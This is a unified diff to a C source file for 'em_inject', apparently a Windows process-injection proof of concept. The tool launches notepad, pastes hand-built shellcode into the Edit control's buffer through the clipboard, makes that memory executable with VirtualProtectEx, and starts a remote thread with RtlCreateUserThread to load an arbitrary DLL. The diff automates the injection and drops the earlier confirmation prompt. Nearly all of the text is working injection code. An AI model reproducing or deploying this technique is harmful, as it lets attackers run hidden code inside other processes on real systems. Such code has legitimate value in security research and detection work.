@@ -1,5 +1,5 @@
 /**
-  Copyright © 2019 Odzhan. All Rights Reserved.
+  Copyright © 2019-2020 Odzhan. All Rights Reserved.
 
   Redistribution and use in source and binary forms, with or without
   modification, are permitted provided that the following conditions are
@@ -35,7 +35,11 @@
 #include <inttypes.h>
 
 #include <windows.h>
+#include <tlhelp32.h>
 #pragma comment(lib, "user32.lib")
+
+// default is 1 second
+#define WAIT_TIME 1000
 
 typedef union _w64_t {
     uint8_t  b[8];
@@ -153,7 +157,7 @@ int store_addr(const char *s, void *out, w64_t *addr, int dll_len) {
     int     i;
     uint8_t *ptr = (uint8_t*)out;
     
-    printf("Storing address of %s : %p\n", s, addr->p);
+    //printf("Storing address of %s : %p\n", s, addr->p);
         
     // initialize new address
     memcpy(ptr, STORE_ADR_INIT, STORE_ADR_INIT_SIZE);
@@ -167,7 +171,6 @@ int store_addr(const char *s, void *out, w64_t *addr, int dll_len) {
     
       // if not allowed for CP_ACP, add 32
       if(!is_allowed(ptr[2])) {
-        printf("0x%02x is being updated.\n", ptr[2]);
         ptr[2] += 32;
         // subtract 32 from byte at runtime
         memcpy(&ptr[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
@@ -227,7 +230,7 @@ void *build_shellcode(w64_t *emaddr, int dll_len, int *outlen)
     rtlexit.p = (void*)GetProcAddress(m, "RtlExitUserThread");
     
     // resolve address of load API
-    m = GetModuleHandle("kernel32");    
+    m = GetModuleHandle("kernelbase");    
     loadlib.p = (void*)GetProcAddress(m, "LoadLibraryW");
     
     // calculate the length of buffer required
@@ -247,8 +250,7 @@ void *build_shellcode(w64_t *emaddr, int dll_len, int *outlen)
     
     // align up by 2 bytes
     unilen = (unilen + 1) & -2;
-    
-    printf("Allocating %" PRId32 " bytes of memory for shellcode.\n", unilen);
+
     cs = uni = (uint8_t*)calloc(sizeof(wchar_t), unilen);
     if(uni == NULL) { 
       printf("calloc(%i) failed.\n", unilen); 
@@ -275,8 +277,6 @@ void *build_shellcode(w64_t *emaddr, int dll_len, int *outlen)
     cslen = (int)(cs - uni);
     padlen = unilen - cslen;
     
-    printf("Padding required  : %" PRId32 "\n", padlen);
-    
     while(padlen--) {
       *cs++ = 0x4D; *cs++ = 0x00;
     }
@@ -294,21 +294,53 @@ void *build_shellcode(w64_t *emaddr, int dll_len, int *outlen)
 }
 
 BOOL CopyData(UINT format, void *data, int cch) {
-    LPTSTR  lptstrCopy; 
-    HGLOBAL hglbCopy;
+    LPTSTR  str; 
+    HGLOBAL gmem;
+    BOOL    bResult = FALSE;
+    HANDLE  hcb;
     
-    if(OpenClipboard(NULL)) {
-      EmptyClipboard();
+    if(!OpenClipboard(NULL)) {
+      printf("unable to open clipboard.\n");
+      return FALSE;
+    }
+    
+    if(!EmptyClipboard()) {
+      printf("unable to empty clipboard.\n");
+      goto exit_copy;
+    }
       
-      hglbCopy = GlobalAlloc(GMEM_MOVEABLE | GMEM_ZEROINIT, (cch + 2)); 
-      lptstrCopy = GlobalLock(hglbCopy); 
-      
-      CopyMemory(lptstrCopy, data, cch); 
-      GlobalUnlock(hglbCopy);
-      SetClipboardData(format, hglbCopy);
-        
-      CloseClipboard();
-      GlobalFree(hglbCopy);
+    gmem = GlobalAlloc(GMEM_MOVEABLE | GMEM_ZEROINIT, (cch + 8));
+    if(gmem == NULL) {
+      printf("unable to allocate memory.\n");
+      goto exit_copy;
+    }
+    
+    str = GlobalLock(gmem); 
+    if(str == NULL) {
+      printf("GlobalLock failed.\n");
+      goto exit_copy;
+    }
+    
+    CopyMemory(str, data, cch); 
+    GlobalUnlock(gmem);
+    hcb = SetClipboardData(format, gmem);
+    GlobalFree(gmem);
+exit_copy:
+    CloseClipboard();
+    return bResult;
+}
+BOOL CALLBACK EnumThreadWnd(HWND hwnd, LPARAM lParam) {
+    char cls[MAX_PATH];
+    HWND hw=NULL, *out = (HWND*)lParam;
+    
+    GetClassName(hwnd, cls, MAX_PATH);
+    
+    if(!lstrcmp(cls, "Notepad")) {
+      hw = FindWindowEx(hwnd, NULL, "Edit", NULL);
+      if(hw != NULL) {
+        *out = hw;
+        return FALSE;
+      }
     }
     return TRUE;
 }
@@ -318,85 +350,112 @@ int main(int argc, char *argv[]) {
     uint8_t               *emh, *cs, *asc, buf[4096];
     DWORD                 pid, old;
     SIZE_T                rd;
-    HWND                  hw;
+    HWND                  hw=NULL, pw;
     CLIENT_ID             cid;
-    HANDLE                ht, hp;
+    HANDLE                ss, ht;
     RtlCreateUserThread_t rtlcreate;
-    w64_t                 embuf;
+    w64_t                 embuf, lastbuf;
     HMODULE               m;
     PCHAR                 dll_path;
+    STARTUPINFO           si;
+    PROCESS_INFORMATION   pi;
+    THREADENTRY32         te;
     
     if(argc != 2) {
-      printf("usage: em_inject <DLL path>\n");
+      printf("usage: em_inject <full path of DLL to inject>\n");
       return 0;
     }
     
     dll_path = argv[1];
     dll_len  = (int)strlen(argv[1]);
-
-    // find parent window for notepad.exe
-    hw = FindWindow(NULL, "Untitled - Notepad");
+    
+    // create host process
+    // wait some time for process to fully initialize
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    
+    CreateProcess(NULL, "notepad", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+    Sleep(WAIT_TIME);
+    
+    EnumThreadWindows(pi.dwThreadId, EnumThreadWnd, (LPARAM)&hw);
+    
     if(hw == NULL) {
-      printf("Unable to find notepad's parent window.\n");
-      return 0;
+      printf("unable to obtain the window handle.\n");
+      goto cleanup;
+    }
+    printf("\nWindow Handle     : %p", (PVOID)hw);
+    
+    // loop until buffer is stable
+    cs = lastbuf.p = NULL;
+    
+    for(;;) {
+      // read the memory handle and buffer
+      emh = (void*)SendMessage(hw, EM_GETHANDLE, 0, 0);
+      ReadProcessMemory(pi.hProcess, emh, &embuf.p, sizeof(ULONG_PTR), &rd);
+      
+      // if this is the same as the last one, end the loop
+      if(embuf.p == lastbuf.p) break;
+      
+      // save this address
+      lastbuf.p = embuf.p;
+      
+      // release memory from last build
+      free(cs);
+      
+      // build the shellcode
+      cs = build_shellcode(&embuf, dll_len, &cs_len);
+    
+      // convert to ASCII and concat the DLL path
+      asc_len = (cs_len/2) + dll_len + 1;
+      asc = calloc(sizeof(char), asc_len);
+      for(i=0; i<cs_len; i+=2) asc[i/2] = cs[i];
+    
+      // add the DLL path
+      strcat((char*)asc, dll_path);
+    
+      // clear the contents of buffer
+      SendMessage(hw, EM_SETSEL, 0, -1);
+      SendMessage(hw, WM_CLEAR, 0, 0);
+    
+      // copy code to remote processs via clipboard
+      // wait some time after copying data to clipboard
+      CopyData(CF_TEXT, asc, asc_len);
+      Sleep(WAIT_TIME);
+      
+      // wait more time to allow notepad to receive the data
+      SendMessage(hw, WM_PASTE, 0, 0);
+      Sleep(WAIT_TIME);
     }
     
-    // obtain the handle for the edit control
-    hw = FindWindowEx(hw, NULL, "Edit", NULL);
-    if(hw == NULL) {
-      printf("Unable to find multiline edit control.\n");
-      return 0;
-    }
+    // set page to RWX
+    VirtualProtectEx(pi.hProcess, embuf.p, 4096, PAGE_EXECUTE_READWRITE, &old);
     
-    // try to force reallocation of the EM buffer
-    memset(buf, 0x4D, sizeof(buf));
-    CopyData(CF_TEXT, buf, 4096);
-    SendMessage(hw, WM_PASTE, 0, 0);
+    m = GetModuleHandle("ntdll");
+    rtlcreate = (RtlCreateUserThread_t)GetProcAddress(m, "RtlCreateUserThread");
     
-    // get the process id and open
-    GetWindowThreadProcessId(hw, &pid);
-    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    printf("Creating new thread...\n");
     
-    // read the memory handle and buffer
-    emh = (void*)SendMessage(hw, EM_GETHANDLE, 0, 0);
-    ReadProcessMemory(hp, emh, &embuf.p, sizeof(ULONG_PTR), &rd);
+    // execute shellcode
+    rtlcreate(pi.hProcess, NULL, FALSE, 0, NULL, 
+      NULL, embuf.p, NULL, &ht, &cid);
     
-    // otherwise, change 1 page to RWX
-    VirtualProtectEx(hp, embuf.p, 4096, PAGE_EXECUTE_READWRITE, &old);
-    
-    // build the shellcode
-    cs = build_shellcode(&embuf, dll_len, &cs_len);
-    
-    // convert to ASCII
-    asc_len = (cs_len/2) + dll_len + 1;
-    asc = calloc(sizeof(char), asc_len);
-    
-    for(i=0; i<cs_len; i+=2) asc[i/2] = cs[i];
-    
-    // copy the DLL path
-    strcat((char*)asc, dll_path);
+    WaitForSingleObject(ht, INFINITE);
     
     // clear the contents of buffer
     SendMessage(hw, EM_SETSEL, 0, -1);
     SendMessage(hw, WM_CLEAR, 0, 0);
     
-    // copy code to remote processs via clipboard
-    CopyData(CF_TEXT, asc, asc_len + 1);
-    SendMessage(hw, WM_PASTE, 0, 0);
-
-    printf("\nCreate thread for remote code? [Y/N]:");
+    printf("Press any key to continue...\n");
+    getchar();
     
-    // create thread?
-    c = getchar();
-    if(tolower(c) == 'y') {
-      m = GetModuleHandle("ntdll");
-      rtlcreate = (RtlCreateUserThread_t)GetProcAddress(m, "RtlCreateUserThread");
-      
-      rtlcreate(hp, NULL, FALSE, 0, NULL, 
-        NULL, embuf.p, NULL, &ht, &cid);
-    }
+    // set page back to RW
+    VirtualProtectEx(pi.hProcess, embuf.p, 4096, old, &old);
+    
     free(cs);
     free(asc);
-    CloseHandle(hp);
+cleanup:
+    TerminateProcess(pi.hProcess, 0);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
     return 0;
 }
